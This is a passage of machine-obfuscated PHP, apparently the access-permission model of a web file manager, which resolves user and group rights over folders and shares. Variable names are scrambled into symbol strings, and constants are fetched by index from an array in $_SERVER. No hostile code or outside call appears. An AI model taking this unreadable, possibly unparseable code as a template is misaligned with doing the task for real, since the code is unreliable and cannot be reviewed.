($ÂÏÀƒ‰Ø[$˝œ∫ﬁ®√[1988]] as $–éæÛ∂¬) { $ˆ≠“£öŸ = Model($˝œ∫ﬁ®√[522])->getInfo($–éæÛ∂¬[$˝œ∫ﬁ®√[1810]]); $ÛÉÅ††‹ = Model($˝œ∫ﬁ®√[538])->getInfoSimpleOuter($¸òΩòÅ≥); $ÛÉÅ††‹[$˝œ∫ﬁ®√[466]] = $–éæÛ∂¬[$˝œ∫ﬁ®√[414]]; if (Model($˝œ∫ﬁ®√[507])->authCheckAction($–éæÛ∂¬[$˝œ∫ﬁ®√[414]][$˝œ∫ﬁ®√[414]], $˝œ∫ﬁ®√[1830])) { continue; } $º’¢«é÷ = array($˝œ∫ﬁ®√[32] => $˝œ∫ﬁ®√[1591] . $ˆ≠“£öŸ[$˝œ∫ﬁ®√[32]], $˝œ∫ﬁ®√[403] => $ˆ≠“£öŸ[$˝œ∫ﬁ®√[87]][$˝œ∫ﬁ®√[403]], $˝œ∫ﬁ®√[78] => KodIO::make($ˆ≠“£öŸ[$˝œ∫ﬁ®√[87]][$˝œ∫ﬁ®√[403]]), $˝œ∫ﬁ®√[498] => $˝œ∫ﬁ®√[190], $˝œ∫ﬁ®√[412] => $˝œ∫ﬁ®√[515], $˝œ∫ﬁ®√[33] => $˝œ∫ﬁ®√[548], $˝œ∫ﬁ®√[519] => $ˆ≠“£öŸ[$˝œ∫ﬁ®√[526]], $˝œ∫ﬁ®√[1810] => $ˆ≠“£öŸ[$˝œ∫ﬁ®√[1810]], $˝œ∫ﬁ®√[523] => $ˆ≠“£öŸ[$˝œ∫ﬁ®√[498]], $˝œ∫ﬁ®√[1985] => array($ÛÉÅ††‹)); $Ω¯¨ÁœÍ[$º’¢«é÷[$˝œ∫ﬁ®√[403]]] = $º’¢«é÷; } } $°â «êº = array(); $á∂õﬁœñ = $this->getAllChildren($¬ñ¥——œ); foreach ($á∂õﬁœñ as $ñãøÂ≠») { $ÈÌ°ëœΩ = !1; foreach ($ñãøÂ≠»[$˝œ∫ﬁ®√[1985]] as $ßÈ∞‘ú˝) { if ($ßÈ∞‘ú˝[$˝œ∫ﬁ®√[1642]]) { if ($ßÈ∞‘ú˝[$˝œ∫ﬁ®√[1642]] == $¸òΩòÅ≥) { $ÈÌ°ëœΩ = !0; break; } } if ($ßÈ∞‘ú˝[$˝œ∫ﬁ®√[1810]]) { if ($this->groupContainUser($ßÈ∞‘ú˝[$˝œ∫ﬁ®√[1810]], $¸òΩòÅ≥)) { $ÈÌ°ëœΩ = !0; break; } } } if ($ÈÌ°ëœΩ) { $°â «êº[] = $ñãøÂ≠»; } $´∂î¨¢» = $ñãøÂ≠»[$˝œ∫ﬁ®√[403]]; if (isset($Ω¯¨ÁœÍ[$´∂î¨¢»])) { $ñãøÂ≠»[$˝œ∫ﬁ®√[1985]][] = $Ω¯¨ÁœÍ[$´∂î¨¢»][0]; $Ω¯¨ÁœÍ[$´∂î¨¢»] = !1; } } $Ω¯¨ÁœÍ = array_filter(array_values($Ω¯¨ÁœÍ)); $°â «êº = array_merge($Ω¯¨ÁœÍ, $°â «êº); return $°â «êº; } public function setAllChildrenByUser($Áëè´é•, $è…ô‡ºœ, $êãÑ—∞À) { $ÿÔõîñ¸ =& $_SERVER[Çâä∆◊¡]; $∞∫’¶˚û = $this->getAllChildrenByUser($Áëè´é•, $è…ô‡ºœ); if (!$êãÑ—∞À || !$∞∫’¶˚û) { return !1; } foreach ($∞∫’¶˚û as $”Ï’‚¸™) { $‡ö‰úÈ = array(); foreach ($”Ï’‚¸™[$ÿÔõîñ¸[1985]] as $ò âÎÑ‹) { $™®û¯ï§ = $ò âÎÑ‹[$ÿÔõîñ¸[466]]; $’æ«∏‘¢ = $ò âÎÑ‹[$ÿÔõîñ¸[1642]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $…‘˙âÌ = $ò âÎÑ‹[$ÿÔõîñ¸[1642]] ? $ò âÎÑ‹[$ÿÔõîñ¸[1642]] : $ò âÎÑ‹[$ÿÔõîñ¸[1810]]; if ($ò âÎÑ‹[$ÿÔõîñ¸[1642]] && $ò âÎÑ‹[$ÿÔõîñ¸[1642]] == $è…ô‡ºœ) { continue; } $‡ö‰úÈ[] = array($ÿÔõîñ¸[403] => $”Ï’‚¸™[$ÿÔõîñ¸[403]], $ÿÔõîñ¸[412] => $’æ«∏‘¢, $ÿÔõîñ¸[504] => intval($…‘˙âÌ), $ÿÔõîñ¸[1911] => isset($™®û¯ï§[$ÿÔõîñ¸[401]]) ? intval($™®û¯ï§[$ÿÔõîñ¸[401]]) : 0, $ÿÔõîñ¸[1965] => isset($™®û¯ï§[$ÿÔõîñ¸[1965]]) ? intval($™®û¯ï§[$ÿÔõîñ¸[1965]]) : -1); } $‡ö‰úÈ[] = array($ÿÔõîñ¸[403] => $”Ï’‚¸™[$ÿÔõîñ¸[403]], $ÿÔõîñ¸[412] => SourceModel::TYPE_USER, $ÿÔõîñ¸[504] => intval($è…ô‡ºœ), $ÿÔõîñ¸[1911] => intval($êãÑ—∞À), $ÿÔõîñ¸[1965] => -1); $this->where(array($ÿÔõîñ¸[418] => $”Ï’‚¸™[$ÿÔõîñ¸[403]]))->delete(); $this->addAll($‡ö‰úÈ); } return !0; } public function get($É’˛¢≥ƒ) { $ﬁ”∆¥∏â = $this->getSourceList(array($É’˛¢≥ƒ), !0); return $ﬁ”∆¥∏â[0]; } public function getSourceList($Ù•ìò§ù, $§›≈Ôàæ = false, $˜ß…≠‡” = false) { $‰∆∏åÚˆ =& $_SERVER[Çâä∆◊¡]; if (!$Ù•ìò§ù) { return array(); } $á·«ï⁄˘ = Model($‰∆∏åÚˆ[1312]); if (!$§›≈Ôàæ && count($Ù•ìò§ù) == 1) { $§›≈Ôàæ = array(); $§›≈Ôàæ[$Ù•ìò§ù[0]] = $á·«ï⁄˘->sourceInfo($Ù•ìò§ù[0]); } if (!$§›≈Ôàæ) { $‹Ìœ©ï§ = array($‰∆∏åÚˆ[418] => array($‰∆∏åÚˆ[419], $Ù•ìò§ù)); $§›≈Ôàæ = $á·«ï⁄˘->field($‰∆∏åÚˆ[1989])->where($‹Ìœ©ï§)->select(); $§›≈Ôàæ = array_to_keyvalue($§›≈Ôàæ, $‰∆∏åÚˆ[403]); } $£úﬁ√ã¥ = $Ù•ìò§ù; foreach ($§›≈Ôàæ as $òª˜àÊ§ => $ß¸ª∆ËÖ) { $œÔÙÈëœ = $á·«ï⁄˘->parentLevelArray($ß¸ª∆ËÖ[$‰∆∏åÚˆ[521]]); $£úﬁ√ã¥ = array_merge($£úﬁ√ã¥, array($òª˜àÊ§), array_reverse($œÔÙÈëœ)); } $£úﬁ√ã¥ = array_values(array_unique($£úﬁ√ã¥)); if (!$£úﬁ√ã¥) { return array(); } $®¿óøÕÌ = $this->sourceAuthSelect($£úﬁ√ã¥); $¯∏€ë˝™ = array(); foreach ($£úﬁ√ã¥ as $œÆ◊Æ◊Ì) { if (isset($®¿óøÕÌ[$œÆ◊Æ◊Ì])) { $¯∏€ë˝™[$œÆ◊Æ◊Ì] = $®¿óøÕÌ[$œÆ◊Æ◊Ì]; } } $ùëé¡Ÿ° = $this->userIsRoot($˜ß…≠‡”); $‹Ÿ≤´·˛ = AuthModel::authAll(); $‡àı‹Õ¬ = array($‰∆∏åÚˆ[415] => $‹Ÿ≤´·˛, $‰∆∏åÚˆ[1990] => array($‰∆∏åÚˆ[420] => 0, $‰∆∏åÚˆ[1816] => $‹Ÿ≤´·˛, $‰∆∏åÚˆ[421] => LNG($‰∆∏åÚˆ[1991]), $‰∆∏åÚˆ[1832] => $‰∆∏åÚˆ[1992])); $´˝ÏË∑≈ = array(); foreach ($§›≈Ôàæ as $œÆ◊Æ◊Ì => $˚Õﬁﬁ—¶) { if ($ùëé¡Ÿ°) { $´˝ÏË∑≈[$œÆ◊Æ◊Ì] = $‡àı‹Õ¬; continue; } $´˝ÏË∑≈[$œÆ◊Æ◊Ì] = $this->makeSourceAuth($˚Õﬁﬁ—¶, $¯∏€ë˝™, $˜ß…≠‡”); } return $´˝ÏË∑≈; } public function authDeepCheck($˘Ó„›¿∞, $î∂Ñ¶€  = false) { $‘ÅÙìÔ· =& $_SERVER[Çâä∆◊¡]; $î∂Ñ¶€  = $î∂Ñ¶€  ? $î∂Ñ¶€  : USER_ID; $¿ŒÍ°Üƒ = $this->makeAuthDeep($î∂Ñ¶€ ); if (!in_array($˘Ó„›¿∞, $¿ŒÍ°Üƒ[$‘ÅÙìÔ·[1993]])) { return !1; } $Ï£≥´Œ‰ = array(); foreach ($¿ŒÍ°Üƒ[$‘ÅÙìÔ·[1994]] as $‚ü≤ﬂ∆ú => $ª®•¬Œ˜) { if (!in_array($˘Ó„›¿∞, $ª®•¬Œ˜)) { continue; } $Ï£≥´Œ‰[] = $‚ü≤ﬂ∆ú; } if (!$Ï£≥´Œ‰) { return !1; } $Î…ÅõˆÉ = $Ï£≥´Œ‰ ? $Ï£≥´Œ‰[0] : $˘Ó„›¿∞; return array($‘ÅÙìÔ·[415] => -1, $‘ÅÙìÔ·[466] => array($‘ÅÙìÔ·[420] => $‘ÅÙìÔ·[1175], $‘ÅÙìÔ·[1816] => $‘ÅÙìÔ·[190], $‘ÅÙìÔ·[421] => LNG($‘ÅÙìÔ·[1995]), $‘ÅÙìÔ·[1832] => $‘ÅÙìÔ·[1996]), $‘ÅÙìÔ·[1997] => LNG($‘ÅÙìÔ·[1998]), $‘ÅÙìÔ·[1999] => $this->sourceAuthInfo($Î…ÅõˆÉ)); } protected function makeAuthDeep($å≈ô‰ãÖ = false) { $ÆÒ¨’íñ =& $_SERVER[Çâä∆◊¡]; static $‡âµÉŒ‹ = array(); $å≈ô‰ãÖ = $å≈ô‰ãÖ ? $å≈ô‰ãÖ : USER_ID; if (isset($‡âµÉŒ‹[$å≈ô‰ãÖ])) { return $‡âµÉŒ‹[$å≈ô‰ãÖ]; } $ªˆººò™ = Model($ÆÒ¨’íñ[2000])->listData(); $´â≠ÑØ´ = array(); foreach ($ªˆººò™ as $Úæç≥ﬂ») { if ($Úæç≥ﬂ»[$ÆÒ¨’íñ[414]] == 0 && $Úæç≥ﬂ»[$ÆÒ¨’íñ[1831]] == $ÆÒ¨’íñ[89]) { $´â≠ÑØ´[] = $Úæç≥ﬂ»[$ÆÒ¨’íñ[401]]; } } $ÆÍéë∑Ò = $this->userGroupParents($å≈ô‰ãÖ); $°Ñ„∑÷∂ = array($ÆÒ¨’íñ[412] => SourceModel::TYPE_USER, $ÆÒ¨’íñ[504] => $å≈ô‰ãÖ); if ($ÆÍéë∑Ò) { $°Ñ„∑÷∂ = array(array($ÆÒ¨’íñ[412] => SourceModel::TYPE_USER, $ÆÒ¨’íñ[504] => $å≈ô‰ãÖ), array($ÆÒ¨’íñ[412] => SourceModel::TYPE_GROUP, $ÆÒ¨’íñ[504] => array($ÆÒ¨’íñ[419], $ÆÍéë∑Ò)), $ÆÒ¨’íñ[987] => $ÆÒ¨’íñ[1905]); } $ÿˆ‹É®Ñ = $this->field($ÆÒ¨’íñ[2001])->where($°Ñ„∑÷∂)->select(); $¨‹¶ﬂå¿ = array(); $ì¢Îó‚¶ = array_to_keyvalue_group($ÿˆ‹É®Ñ, $ÆÒ¨’íñ[403]); foreach ($ì¢Îó‚¶ as $’≥˚Åÿº => $ñ¬¬ö˝â) { $õÎ¡™•® = $this->authArrayCheck($ñ¬¬ö˝â, $å≈ô‰ãÖ); if ($õÎ¡™•®[$ÆÒ¨’íñ[415]] > 0) { $¨‹¶ﬂå¿[] = $’≥˚Åÿº . $ÆÒ¨’íñ[12]; } } if ($ÆÍéë∑Ò) { $œáÏ˝˛¯ = Model($ÆÒ¨’íñ[522]); foreach ($ÆÍéë∑Ò as $‹˙»ª·ø) { $¸ûÏ¢Ùƒ = $œáÏ˝˛¯->getInfo($‹˙»ª·ø); if (!$¸ûÏ¢Ùƒ || !is_array($¸ûÏ¢Ùƒ[$ÆÒ¨’íñ[87]])) { continue; } $¨‹¶ﬂå¿[] = $¸ûÏ¢Ùƒ[$ÆÒ¨’íñ[87]][$ÆÒ¨’íñ[403]]; } } $ﬂ˝⁄Ú⁄û = array(); $≤ﬁ˚èøΩ = $ÆÍéë∑Ò; $Ü¯ÉπÉƒ = Model($ÆÒ¨’íñ[1312]); $œáÏ˝˛¯ = Model($ÆÒ¨’íñ[522]); $≈°ú—·Å = array(); $°˛ÌÅŸ = array(); $‘Ûµ…Û’ = array(); $Ú÷ë¥ü∞ = array(); if ($¨‹¶ﬂå¿) { $˚æüÉÆä = $Ü¯ÉπÉƒ->where(array($ÆÒ¨’íñ[403] => array($ÆÒ¨’íñ[419], $¨‹¶ﬂå¿)))->select(); foreach ($˚æüÉÆä as $ç∆ΩΩ∆é) { $ ÊﬁŒâÏ = $Ü¯ÉπÉƒ->parentLevelArray($ç∆ΩΩ∆é[$ÆÒ¨’íñ[521]]); $ﬂ˝⁄Ú⁄û = array_merge($ﬂ˝⁄Ú⁄û, $ ÊﬁŒâÏ); $≤ﬁ˚èøΩ[] = $ç∆ΩΩ∆é[$ÆÒ¨’íñ[504]]; $≈°ú—·Å[$ç∆ΩΩ∆é[$ÆÒ¨’íñ[403]]] = $ ÊﬁŒâÏ; $°˛ÌÅŸ[$ç∆ΩΩ∆é[$ÆÒ¨’íñ[403]]] = $ç∆ΩΩ∆é[$ÆÒ¨’íñ[504]]; } } $≤ﬁ˚èøΩ = array_values(array_unique($≤ﬁ˚èøΩ)); $Ω⁄¡·⁄≠ = $≤ﬁ˚èøΩ; foreach ($Ω⁄¡·⁄≠ as $‹˙»ª·ø) { $¸ûÏ¢Ùƒ = $œáÏ˝˛¯->getInfo($‹˙»ª·ø); $ ÊﬁŒâÏ = $Ü¯ÉπÉƒ->parentLevelArray($¸ûÏ¢Ùƒ[$ÆÒ¨’íñ[521]]); $≤ﬁ˚èøΩ = array_merge($≤ﬁ˚èøΩ, $ ÊﬁŒâÏ); } $≤ﬁ˚èøΩ = array_values(array_unique($≤ﬁ˚èøΩ)); foreach ($≤ﬁ˚èøΩ as $‹˙»ª·ø) { $¸ûÏ¢Ùƒ = $œáÏ˝˛¯->getInfo($‹˙»ª·ø); $ﬂ˝⁄Ú⁄û[] = $¸ûÏ¢Ùƒ[$ÆÒ¨’íñ[87]][$ÆÒ¨’íñ[403]]; $‘Ûµ…Û’[$‹˙»ª·ø] = $¸ûÏ¢Ùƒ[$ÆÒ¨’íñ[87]][$ÆÒ¨’íñ[403]]; $Ú÷ë¥ü∞[$‹˙»ª·ø] = $Ü¯ÉπÉƒ->parentLevelArray($¸ûÏ¢Ùƒ[$ÆÒ¨’íñ[521]]); } foreach ($≈°ú—·Å as $ôïú•˘µ => $·˜ß∏ØŒ) { $öâ∆Â‡∂ = $°˛ÌÅŸ[$ôïú•˘µ]; if (!$öâ∆Â‡∂ || !$‘Ûµ…Û’[$öâ∆Â‡∂]) { continue; } $°„›öÁã = array(); foreach ($Ú÷ë¥ü∞[$öâ∆Â‡∂] as $‹˙»ª·ø) { $°„›öÁã[] = $‘Ûµ…Û’[$‹˙»ª·ø]; } $≈°ú—·Å[$ôïú•˘µ] = array_merge($°„›öÁã, $·˜ß∏ØŒ); } $ﬂ˝⁄Ú⁄û = array_values(array_unique($ﬂ˝⁄Ú⁄û)); $Ï•Í¿èã = array($ÆÒ¨’íñ[1993] => $ﬂ˝⁄Ú⁄û, $ÆÒ¨’íñ[1994] => $≈°ú—·Å); $‡âµÉŒ‹[$å≈ô‰ãÖ] = $Ï•Í¿èã; return $Ï•Í¿èã; } private function makeSourceAuth($Üë∂íêÛ, $¬˛’‹åØ, $±Å¯ﬁµã = false) { $Æﬂ£∏Òõ =& $_SERVER[Çâä∆◊¡]; $¬Ü¬¥‚ù = $Æﬂ£∏Òõ[89]; $„æ≈€Û¶ = $Üë∂íêÛ[$Æﬂ£∏Òõ[504]]; $´ÿ”™ŸÙ = $Üë∂íêÛ[$Æﬂ£∏Òõ[412]] == SourceModel::TYPE_GROUP; $ê™≈Àı  = $´ÿ”™ŸÙ ? $this->groupRootAuth($„æ≈€Û¶, $±Å¯ﬁµã) : !1; if ($ê™≈Àı  && Model($Æﬂ£∏Òõ[507])->authCheckAction($ê™≈Àı [$Æﬂ£∏Òõ[414]], $Æﬂ£∏Òõ[1830])) { return $this->groupAuthInfo($ê™≈Àı , $„æ≈€Û¶); } $ÑöÎ⁄ñ‹ = Model($Æﬂ£∏Òõ[1312])->parentLevelArray($Üë∂íêÛ[$Æﬂ£∏Òõ[521]]); $ÑöÎ⁄ñ‹ = array_merge(array($Üë∂íêÛ[$Æﬂ£∏Òõ[403]]), array_reverse($ÑöÎ⁄ñ‹)); $°π≠∏Éˆ = !1; foreach ($ÑöÎ⁄ñ‹ as $„√™◊ıº) { if (!isset($¬˛’‹åØ[$„√™◊ıº])) { continue; } $©ΩË£Ä‚ = $this->authMake($¬˛’‹åØ[$„√™◊ıº], $±Å¯ﬁµã); if ($©ΩË£Ä‚[$Æﬂ£∏Òõ[466]]) { $°π≠∏Éˆ = $©ΩË£Ä‚; break; } } if (!$´ÿ”™ŸÙ) { return $°π≠∏Éˆ; } if (!$°π≠∏Éˆ && $ê™≈Àı ) { $°π≠∏Éˆ = $this->groupAuthInfo($ê™≈Àı , $„æ≈€Û¶); } if (!$°π≠∏Éˆ) { $¡π ≈ïà = Model($Æﬂ£∏Òõ[522])->getInfo($„æ≈€Û¶); $≤–ÃúÁÕ = explode($Æﬂ£∏Òõ[50], trim($¡π ≈ïà[$Æﬂ£∏Òõ[521]], $Æﬂ£∏Òõ[50])); $≤–ÃúÁÕ = array_reverse($≤–ÃúÁÕ); foreach ($≤–ÃúÁÕ as $—äú—Ôß) { if ($—äú—Ôß == $Æﬂ£∏Òõ[190] || $—äú—Ôß == $¬Ü¬¥‚ù) { continue; } $≠¢§ÆÙ = $this->groupRootAuth($—äú—Ôß, $±Å¯ﬁµã); if (!$≠¢§ÆÙ) { continue; } $°π≠∏Éˆ = $this->groupAuthInfo($≠¢§ÆÙ, $—äú—Ôß); break; } } if (!$°π≠∏Éˆ || $°π≠∏Éˆ[$Æﬂ£∏Òõ[415]] <= 0) { $⁄†Çï≠Ì = $this->authDeepCheck($Üë∂íêÛ[$Æﬂ£∏Òõ[403]], $±Å¯ﬁµã); if ($⁄†Çï≠Ì) { $°π≠∏Éˆ = $⁄†Çï≠Ì; } } return $°π≠∏Éˆ; } private function userIsRoot($ØÆé¨Ùå = false) { $ì¢‰™∫ì =& $_SERVER[Çâä∆◊¡]; if (!$ØÆé¨Ùå && _get($GLOBALS, $ì¢‰™∫ì[505])) { return !0; } $åª√˘Õí = Model($ì¢‰™∫ì[538])->getInfo($ØÆé¨Ùå); $Ç∫∆¸•ı = Model($ì¢‰™∫ì[2002])->listData($åª√˘Õí[$ì¢‰™∫ì[1519]]); if ($Ç∫∆¸•ı && $Ç∫∆¸•ı[$ì¢‰™∫ì[511]][$ì¢‰™∫ì[2003]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ﬂ◊·’∆) { $—ñ‚•¥— =& $_SERVER[Çâä∆◊¡]; $–ÓÙ‹êÍ = Model($—ñ‚•¥—[1312]); $…ıﬁ¸≠π = $–ÓÙ‹êÍ->sourceInfo($ﬂ◊·’∆); if (!$…ıﬁ¸≠π) { return !1; } $–ÓÙ‹êÍ->groupPathDisplay($…ıﬁ¸≠π); $§ó”„Ùå = array($…ıﬁ¸≠π); $§ó”„Ùå = $–ÓÙ‹êÍ->_listAppendPath($§ó”„Ùå); $…ıﬁ¸≠π = $§ó”„Ùå[0]; $ÿü¨ÍŸ˝ = $…ıﬁ¸≠π[$—ñ‚•¥—[519]]; if (isset($…ıﬁ¸≠π[$—ñ‚•¥—[527]])) { $œØÁòæç = explode($—ñ‚•¥—[8], trim($…ıﬁ¸≠π[$—ñ‚•¥—[519]], $—ñ‚•¥—[8])); array_shift($œØÁòæç); $ÿü¨ÍŸ˝ = $…ıﬁ¸≠π[$—ñ‚•¥—[525]] . $—ñ‚•¥—[2004] . implode($—ñ‚•¥—[8], $œØÁòæç); } return array($—ñ‚•¥—[421] => $…ıﬁ¸≠π[$—ñ‚•¥—[32]], $—ñ‚•¥—[78] => KodIO::make($…ıﬁ¸≠π[$—ñ‚•¥—[403]]), $—ñ‚•¥—[2005] => $ÿü¨ÍŸ˝); } private function groupAuthInfo($áäıà•ï, $áÆ˙»É≠) { $∞ıÛÀõ =& $_SERVER[Çâä∆◊¡]; $óﬂËÿß¨ = Model($∞ıÛÀõ[522])->getInfo($áÆ˙»É≠); return array($∞ıÛÀõ[2006] => intval($áäıà•ï[$∞ıÛÀõ[414]]), $∞ıÛÀõ[1990] => $áäıà•ï, $∞ıÛÀõ[2007] => LNG($∞ıÛÀõ[2008]), $∞ıÛÀõ[1999] => array($∞ıÛÀõ[421] => $óﬂËÿß¨[$∞ıÛÀõ[32]], $∞ıÛÀõ[78] => KodIO::make($óﬂËÿß¨[$∞ıÛÀõ[87]][$∞ıÛÀõ[403]]), $∞ıÛÀõ[2005] => $óﬂËÿß¨[$∞ıÛÀõ[526]])); } protected function groupRootAuth($ÔªÉ¬ƒ’, $∆§•«ı∫ = false) { $Ãƒ◊ÅÜ¡ =& $_SERVER[Çâä∆◊¡]; $∆§•«ı∫ = $∆§•«ı∫ ? $∆§•«ı∫ : USER_ID; $¨ﬂ¸˙™◊ = $∆§•«ı∫ . $Ãƒ◊ÅÜ¡[2009] . $ÔªÉ¬ƒ’; static $˛å‰Ÿ≤Ä = array(); if (isset($˛å‰Ÿ≤Ä[$¨ﬂ¸˙™◊])) { return $˛å‰Ÿ≤Ä[$¨ﬂ¸˙™◊]; } $°Ï∏‚ ƒ = Model($Ãƒ◊ÅÜ¡[522])->getInfo($ÔªÉ¬ƒ’); $èﬂÃºÅæ = $this->userGroupList($∆§•«ı∫); $ÔòÄ√ = isset($èﬂÃºÅæ[$ÔªÉ¬ƒ’]) ? $èﬂÃºÅæ[$ÔªÉ¬ƒ’][$Ãƒ◊ÅÜ¡[414]] : !1; if ($ÔòÄ√ && Model($Ãƒ◊ÅÜ¡[507])->authCheckAction($ÔòÄ√[$Ãƒ◊ÅÜ¡[414]], $Ãƒ◊ÅÜ¡[1830])) { $˛å‰Ÿ≤Ä[$¨ﬂ¸˙™◊] = $ÔòÄ√; return $ÔòÄ√; } $‘‹°®ê≤ = $this->sourceAuthSelect($°Ï∏‚ ƒ[$Ãƒ◊ÅÜ¡[87]][$Ãƒ◊ÅÜ¡[403]]); $èÛ∑˘˙ñ = $‘‹°®ê≤ ? $this->authMake($‘‹°®ê≤, $∆§•«ı∫) : !1; $ºŸ◊ÎãΩ = $èÛ∑˘˙ñ ? $èÛ∑˘˙ñ[$Ãƒ◊ÅÜ¡[466]] : !1; $˛å‰Ÿ≤Ä[$¨ﬂ¸˙™◊] = $ºŸ◊ÎãΩ ? $ºŸ◊ÎãΩ : $ÔòÄ√; return $˛å‰Ÿ≤Ä[$¨ﬂ¸˙™◊]; } public function authOwnerApply($¥ÇÊ∫≥Ñ) { $Ã∏“åÈõ =& $_SERVER[Çâä∆◊¡]; if (empty($¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[414]]) || isset($¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[2010]]) && $¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[2010]]) { return $¥ÇÊ∫≥Ñ; } if (AuthModel::authCheckRoot($¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[414]][$Ã∏“åÈõ[415]])) { return $¥ÇÊ∫≥Ñ; } $≤‰Õÿµ¨ = Model($Ã∏“åÈõ[1312])->parentLevelArray($¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[521]]); $≤‰Õÿµ¨ = array_merge(array($¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[403]]), array_reverse($≤‰Õÿµ¨)); $ñ¯È¢µÅ = $this->sourceAuthSelect($≤‰Õÿµ¨); $¨ç˘˚ÇÏ = array(); $¿ÕΩÜ¸Ì = array(); foreach ($ñ¯È¢µÅ as $¸˝±ƒ·À => $√ﬂ¨˘·Ò) { $¸À¥˙Ôü = $this->authFolderOwnerUser($√ﬂ¨˘·Ò); $¨ç˘˚ÇÏ[$¸˝±ƒ·À] = $¸À¥˙Ôü; $¿ÕΩÜ¸Ì = array_merge($¿ÕΩÜ¸Ì, $¸À¥˙Ôü[$Ã∏“åÈõ[594]]); if ($¸À¥˙Ôü[$Ã∏“åÈõ[2011]]) { break; } } if (count($¿ÕΩÜ¸Ì) == 0) { $¿ÕΩÜ¸Ì = $this->authFolderOwnerGroup($¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[504]]); } $¿ÕΩÜ¸Ì = array_unique($¿ÕΩÜ¸Ì); if (AuthModel::authCheckRoot($¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[414]][$Ã∏“åÈõ[415]])) { $¿ÕΩÜ¸Ì[] = USER_ID; } $¥ÇÊ∫≥Ñ[$Ã∏“åÈõ[414]][$Ã∏“åÈõ[2012]] = Model($Ã∏“åÈõ[513])->userListInfo($¿ÕΩÜ¸Ì); return $¥ÇÊ∫≥Ñ; } private function authFolderOwnerGroup($å¡ä¡ﬁ˝) { $ç®›äï¯ =& $_SERVER[Çâä∆◊¡]; $êƒÚ÷µ∑ = Model($ç®›äï¯[1899])->where(array($ç®›äï¯[1810] => $å¡ä¡ﬁ˝))->select(); $ñìº≤íµ = array(); if (!$êƒÚ÷µ∑) { return $ñìº≤íµ; } foreach ($êƒÚ÷µ∑ as $ ‚éÚ—¸) { $œÂŒÊΩá = $this->authInfo($ ‚éÚ—¸); if (AuthModel::authCheckRoot($œÂŒÊΩá[$ç®›äï¯[414]])) { $ñìº≤íµ[] = $ ‚éÚ—¸[$ç®›äï¯[1642]]; } } return $ñìº≤íµ; } private function authFolderOwnerUser($í°˝‰ﬁø) { $¿∏ﬂ∆ëΩ =& $_SERVER[Çâä∆◊¡]; $çÎÊ´≈¡ = array(); $˘ÎØÌá∫ = !1; foreach ($í°˝‰ﬁø as $çﬁ∫ï‚∫) { $Ÿ¶ÕËÔ– = $this->authInfo($çﬁ∫ï‚∫); if ($çﬁ∫ï‚∫[$¿∏ﬂ∆ëΩ[504]] == $¿∏ﬂ∆ëΩ[190]) { $˘ÎØÌá∫ = !0; } if ($çﬁ∫ï‚∫[$¿∏ﬂ∆ëΩ[412]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ÿ¶ÕËÔ–[$¿∏ﬂ∆ëΩ[414]])) { $çÎÊ´≈¡[] = $çﬁ∫ï‚∫[$¿∏ﬂ∆ëΩ[504]]; } } } return array($¿∏ﬂ∆ëΩ[594] => $çÎÊ´≈¡, $¿∏ﬂ∆ëΩ[2011] => $˘ÎØÌá∫); } public function authMake($≤–Â»˚¿, $ò®≠ ∑∆ = false) { $¡üﬁ‰›ú =& $_SERVER[Çâä∆◊¡]; $€ÉÚÂÌ∏ = $this->authArrayCheck($≤–Â»˚¿, $ò®≠ ∑∆); if ($€ÉÚÂÌ∏[$¡üﬁ‰›ú[2013]]) { $€ÉÚÂÌ∏[$¡üﬁ‰›ú[2013]] = $this->sourceAuthInfo($€ÉÚÂÌ∏[$¡üﬁ‰›ú[2013]]); } return $€ÉÚÂÌ∏; } public function authArrayCheck($Â∞Ãà«û, $É˝€µçﬁ = false) { $‡âìÈÊÄ =& $_SERVER[Çâä∆◊¡]; if (!$Â∞Ãà«û) { return array($‡âìÈÊÄ[415] => 0, $‡âìÈÊÄ[466] => !1); } $É˝€µçﬁ = $É˝€µçﬁ ? $É˝€µçﬁ : USER_ID; $Ç·ÑîÊ = 0; $ç˘ÆÓËÀ = 0; $ïÄãô…• = 0; $ﬁ≠·∂Æë = 0; $Åﬁ÷Çˆ = 0; $Ïï±›°¶ = 0; $ã¢≠‚é = 1000; $ÔŒ˛¿œé = 0; $¸„ﬁŸ”Ó = 0; $Äáêã†œ = 0; $‚…∏ﬂﬂ¿ = 0; $‡ëûûå› = array($‡âìÈÊÄ[403] => 0); foreach ($Â∞Ãà«û as $‡ëûûå›) { $˚Ç’ç¯ª = $this->authInfo($‡ëûûå›); if (!$˚Ç’ç¯ª) { continue; } $∂√ùﬂßì = $‡ëûûå›[$‡âìÈÊÄ[504]]; $Ó◊´çî  = intval($˚Ç’ç¯ª[$‡âìÈÊÄ[414]]); if ($‡ëûûå›[$‡âìÈÊÄ[412]] == SourceModel::TYPE_USER && $∂√ùﬂßì == $É˝€µçﬁ) { $Ç·ÑîÊ = !0; $ïÄãô…• = $˚Ç’ç¯ª; $ç˘ÆÓËÀ = $Ó◊´çî ; } else { if ($‡ëûûå›[$‡âìÈÊÄ[412]] == SourceModel::TYPE_GROUP && $this->groupContainUser($∂√ùﬂßì, $É˝€µçﬁ)) { $ﬁ≠·∂Æë = !0; $˚Ÿ©îËÌ = $this->groupStepToUserGroup($∂√ùﬂßì, $É˝€µçﬁ); if ($˚Ÿ©îËÌ < $ã¢≠‚é) { $ã¢≠‚é = $˚Ÿ©îËÌ; $Åﬁ÷Çˆ = $Ó◊´çî ; $Ïï±›°¶ = $˚Ç’ç¯ª; $ÔŒ˛¿œé = $∂√ùﬂßì; } if ($˚Ÿ©îËÌ == $ã¢≠‚é && $Ó◊´çî  >= $Åﬁ÷Çˆ) { $Åﬁ÷Çˆ = $Ó◊´çî ; $Ïï±›°¶ = $˚Ç’ç¯ª; $ÔŒ˛¿œé = $∂√ùﬂßì; } } else { if ($∂√ùﬂßì == $‡âìÈÊÄ[190]) { $¸„ﬁŸ”Ó = !0; $‚…∏ﬂﬂ¿ = $˚Ç’ç¯ª; $Äáêã†œ = $Ó◊´çî ; } } } } if 